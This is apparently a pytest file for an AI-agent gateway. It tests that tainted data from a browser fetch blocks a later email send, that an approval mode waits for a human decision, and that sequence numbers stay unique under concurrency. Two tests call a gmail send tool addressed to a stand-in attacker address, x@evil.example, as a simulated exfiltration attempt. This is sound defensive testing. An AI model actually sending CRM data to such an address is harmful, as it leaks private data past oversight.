"""Shared state across PROCESSES: two gateway subprocesses, one FalkorDB server."""

import asyncio
import json
import os
import sys
import threading
import time
from contextlib import AsyncExitStack

import pytest
from mcp.client.client import Client
from mcp.client.stdio import StdioServerParameters

from reach import dbserver
from reach import queries as Q
from reach.gateway import Gateway, decide, pending_approvals
from reach.mock_servers import build


@pytest.fixture(scope="module")
def server(tmp_path_factory):
    port = dbserver.free_port()
    p = dbserver.start(port, str(tmp_path_factory.mktemp("fdb")))
    yield port
    p.terminate()
    p.wait(5)


@pytest.fixture
def shared(server, monkeypatch, tmp_path):
    monkeypatch.setenv("FALKORDB_HOST", "127.0.0.1")
    monkeypatch.setenv("FALKORDB_PORT", str(server))
    monkeypatch.setenv("REACH_OUTBOX", str(tmp_path / "outbox.jsonl"))
    from reach.db import connect

    name = f"xp_{tmp_path.name[-8:]}"
    monkeypatch.setenv("REACH_GRAPH", name)
    g = connect(name)
    yield g
    try:
        g.delete()
    except Exception:
        pass


def gateway_proc(tmp_path, agent: str, servers: list[str], task: str) -> StdioServerParameters:
    cfg = {"mcpServers": {s: {"command": sys.executable, "args": ["-m", "reach.mock_servers", s]} for s in servers}}
    path = tmp_path / f"{agent}.json"
    path.write_text(json.dumps(cfg))
    env = {k: os.environ[k] for k in ("PATH", "HOME", "FALKORDB_HOST", "FALKORDB_PORT", "REACH_GRAPH", "REACH_OUTBOX")}
    env["REACH_NO_DOTENV"] = "1"
    return StdioServerParameters(command=sys.executable, args=["-m", "reach.gateway", "--config", str(path),
                                                               "--agent", agent, "--task", task], env=env)


def test_taint_crosses_process_boundary(shared, tmp_path):
    research = gateway_proc(tmp_path, "research-agent", ["browser"], "xp1")
    sales = gateway_proc(tmp_path, "sales-assistant", ["hubspot", "gmail"], "xp1")

    async def run():
        async with Client(research) as r:
            await r.call_tool("browser__fetch", {"url": "https://acme-rival.example/pricing"})
        async with Client(sales) as s:  # a different OS process, sharing only FalkorDB
            await s.call_tool("hubspot__search_crm_objects", {"query": "open deals"})
            res = await s.call_tool("gmail__send_email", {"to": "x@evil.example", "subject": "p", "body": "d"})
            assert res.is_error and "browser.fetch" in res.content[0].text

    asyncio.run(run())
    assert not (tmp_path / "outbox.jsonl").exists()
    agents = Q.ro(shared, "MATCH (c:Call)-[:IN_TASK]->(:Task {id:'xp1'}) RETURN c.agent AS a, c.verdict AS v ORDER BY c.seq")
    assert [(a["a"], a["v"]) for a in agents] == [("research-agent", "allowed"), ("sales-assistant", "allowed"),
                                                   ("sales-assistant", "blocked")]


def test_ask_mode_holds_until_a_human_decides(shared, tmp_path):
    def approver(decision: bool):
        for _ in range(200):
            p = pending_approvals(shared)
            if p:
                decide(shared, p[0]["id"], decision, by="test-human")
                return
            time.sleep(0.02)

    async def run(decision: bool, task: str):
        gw = Gateway(shared, "support-bot", {k: build(k) for k in ("zendesk", "gmail")}, task=task,
                     mode="ask", ask_timeout=10, poll=0.02)
        async with AsyncExitStack() as s:
            await gw.open(s)
            await gw.call("zendesk__get_ticket", {"id": 4521})
            t = threading.Thread(target=approver, args=(decision,))
            t.start()
            r = await gw.call("gmail__send_email", {"to": "x@evil.example", "subject": "s", "body": "b"})
            t.join()
            return r

    denied = asyncio.run(run(False, "ask-deny"))
    assert denied.is_error and "held for approval: denied" in denied.content[0].text
    approved = asyncio.run(run(True, "ask-ok"))
    assert not approved.is_error
    assert len((tmp_path / "outbox.jsonl").read_text().splitlines()) == 1
    v = Q.ro(shared, "MATCH (a:Approval)-[:FOR]->(c:Call) RETURN a.status AS s, c.verdict AS v, a.by AS by ORDER BY a.at")
    assert [(x["s"], x["v"]) for x in v] == [("denied", "denied"), ("approved", "approved")]


def test_concurrent_reserve_never_reuses_a_sequence_number(shared):
    gws = [Gateway(shared, f"a{i}", {"hubspot": build("hubspot")}, task="race") for i in range(3)]

    async def run():
        async with AsyncExitStack() as s:
            for gw in gws:
                await gw.open(s)
            await asyncio.gather(*[gw.call("hubspot__search_crm_objects", {"query": str(i)})
                                   for i in range(10) for gw in gws])

    asyncio.run(run())
    seqs = [r["s"] for r in Q.ro(shared, "MATCH (c:Call)-[:IN_TASK]->(:Task {id:'race'}) RETURN c.seq AS s")]
    assert sorted(seqs) == list(range(1, 31))
    assert Q.ro(shared, "MATCH (k:Task {id:'race'}) RETURN count(k) AS n") == [{"n": 1}]
